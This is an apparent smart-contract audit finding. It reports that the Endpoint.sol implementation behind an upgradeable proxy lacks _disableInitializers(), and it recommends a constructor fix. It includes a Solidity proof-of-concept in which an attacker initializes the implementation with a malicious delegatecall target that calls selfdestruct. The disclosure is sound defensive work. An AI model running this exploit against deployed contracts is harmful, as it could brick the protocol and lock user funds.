### Title
Uninitialized `Endpoint` Implementation Contract Allows Attacker to Destroy It via `delegatecall` — (File: `core/contracts/Endpoint.sol`)

---

### Summary

`Endpoint.sol` is deployed behind a `TransparentUpgradeableProxy` but its implementation contract has no constructor calling `_disableInitializers()`. This allows any unprivileged caller to directly `initialize` the implementation contract with attacker-controlled arguments — including a malicious `_endpointTx` address. Because `Endpoint` performs `delegatecall` to `endpointTx` on every transaction dispatch, an attacker can use this to run arbitrary code (including `selfdestruct`) in the context of the implementation contract, permanently destroying it and bricking the entire protocol.

---

### Finding Description

`Endpoint.sol` inherits from `EIP712Upgradeable` and `OwnableUpgradeable` and exposes an `initialize` function guarded only by the `initializer` modifier: [1](#0-0) 

The `initializer` modifier prevents re-initialization on the **proxy** (where `_initialized` is already set), but the **implementation contract** itself has its own separate storage where `_initialized` starts at `0`. Because `Endpoint.sol` has no constructor calling `_disableInitializers()`, the implementation contract is permanently open to a first-call `initialize` from any address. [2](#0-1) 

The `initialize` function accepts `_endpointTx` as a caller-supplied argument and stores it directly: [3](#0-2) 

`endpointTx` is then used as the target of `delegatecall` in `_delegatecallEndpointTx`, which is invoked by every transaction-processing path (`submitSlowModeTransaction`, `processTransaction`, `processSlowModeTransaction`): [4](#0-3) 

---

### Impact Explanation

If an attacker destroys the `Endpoint` implementation contract via `selfdestruct` (run in the implementation's execution context via `delegatecall`), the `TransparentUpgradeableProxy` will forward all future calls to an address with no code. EVM calls to codeless addresses return `(true, "")` — meaning every protocol operation (deposits, withdrawals, order matching, liquidations, slow-mode transactions) will silently appear to succeed while executing nothing. All user funds deposited into the protocol become permanently inaccessible with no on-chain revert to signal failure.

---

### Likelihood Explanation

The attack requires no privileges, no governance capture, and no leaked keys. The attacker only needs to:
1. Deploy a malicious `endpointTx` contract whose `fallback` calls `selfdestruct`.
2. Deploy a stub `clearinghouse` that satisfies the `getEngineByType` calls in `initialize`.
3. Call `initialize` on the `Endpoint` implementation address (publicly readable from the proxy's admin slot).
4. Call any function that routes through `_delegatecallEndpointTx` (e.g., `submitSlowModeTransaction`) directly on the implementation.

This is a four-step, zero-cost attack executable by any EOA.

---

### Recommendation

Add a constructor to `Endpoint.sol` that calls `_disableInitializers()`, matching the pattern already correctly applied in `BaseProxyManager`:

```solidity
/// @custom:oz-upgrades-unsafe-allow constructor
constructor() {
    _disableInitializers();
}
``` [5](#0-4) 

This prevents any direct call to `initialize` on the implementation contract. The same fix should be audited for `Clearinghouse.sol`, which also performs `delegatecall` to `clearinghouseLiq` and may share the same missing constructor pattern. [6](#0-5) 

---

### Proof of Concept

```solidity
// 1. Attacker deploys a malicious endpointTx
contract MaliciousEndpointTx {
    fallback() external payable {
        selfdestruct(payable(address(0)));
    }
}

// 2. Attacker deploys a stub clearinghouse satisfying initialize()
contract StubClearinghouse {
    function getEngineByType(uint8) external view returns (address) {
        return address(this); // returns self as both spot and perp engine
    }
    // stub any other called methods...
}

// 3. Attacker reads implementation address from proxy admin slot
address impl = /* read slot 0x360894... from Endpoint proxy */;

// 4. Attacker initializes the implementation directly
IEndpoint(impl).initialize(
    address(0),          // _sanctions (stub)
    address(0),          // _sequencer
    address(0),          // _offchainExchange
    IClearinghouse(address(new StubClearinghouse())),
    address(0),          // _verifier
    address(new MaliciousEndpointTx())  // _endpointTx
);

// 5. Attacker triggers delegatecall → selfdestruct on the implementation
IEndpoint(impl).submitSlowModeTransaction(/* any bytes */);

// Result: Endpoint implementation is destroyed.
// All proxy calls now return (true, "") silently.
``` [7](#0-6)

### Citations

**File:** core/contracts/Endpoint.sol (L23-66)
```text
contract Endpoint is
    EIP712Upgradeable,
    OwnableUpgradeable,
    EndpointStorage,
    IEndpoint
{
    using ERC20Helper for IERC20Base;

    function initialize(
        address _sanctions,
        address _sequencer,
        address _offchainExchange,
        IClearinghouse _clearinghouse,
        address _verifier,
        address _endpointTx
    ) external initializer {
        __Ownable_init();
        __EIP712_init("Nado", "0.0.1");
        sequencer = _sequencer;
        clearinghouse = _clearinghouse;
        offchainExchange = _offchainExchange;
        verifier = IVerifier(_verifier);
        sanctions = ISanctionsList(_sanctions);
        endpointTx = _endpointTx;
        spotEngine = ISpotEngine(
            clearinghouse.getEngineByType(IProductEngine.EngineType.SPOT)
        );
        perpEngine = IPerpEngine(
            clearinghouse.getEngineByType(IProductEngine.EngineType.PERP)
        );
        slowModeConfig = SlowModeConfig({timeout: 0, txCount: 0, txUpTo: 0});
        priceX18[QUOTE_PRODUCT_ID] = ONE;

        if (nlpPools.length == 0) {
            nlpPools.push(
                NlpPool({
                    poolId: 0,
                    subaccount: N_ACCOUNT,
                    owner: address(0),
                    balanceWeightX18: uint128(ONE)
                })
            );
        }
    }
```

**File:** core/contracts/Endpoint.sol (L68-84)
```text
    function _delegatecallEndpointTx(bytes memory callData)
        internal
        returns (bytes memory)
    {
        require(endpointTx != address(0), "Endpoint Tx not set");
        (bool success, bytes memory result) = endpointTx.delegatecall(callData);
        if (!success) {
            if (result.length == 0) {
                revert();
            }
            // solhint-disable-next-line no-inline-assembly
            assembly {
                revert(add(result, 0x20), mload(result))
            }
        }
        return result;
    }
```

**File:** core/contracts/Endpoint.sol (L173-183)
```text
    function submitSlowModeTransaction(bytes calldata transaction)
        external
        virtual
    {
        _delegatecallEndpointTx(
            abi.encodeWithSelector(
                EndpointTx.submitSlowModeTransactionImpl.selector,
                transaction
            )
        );
    }
```

**File:** core/contracts/BaseProxyManager.sol (L102-105)
```text
    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }
```

**File:** core/contracts/Clearinghouse.sol (L658-661)
```text
        (bool success, bytes memory result) = clearinghouseLiq.delegatecall(
            liquidateSubaccountCall
        );
        require(success, string(result));
```
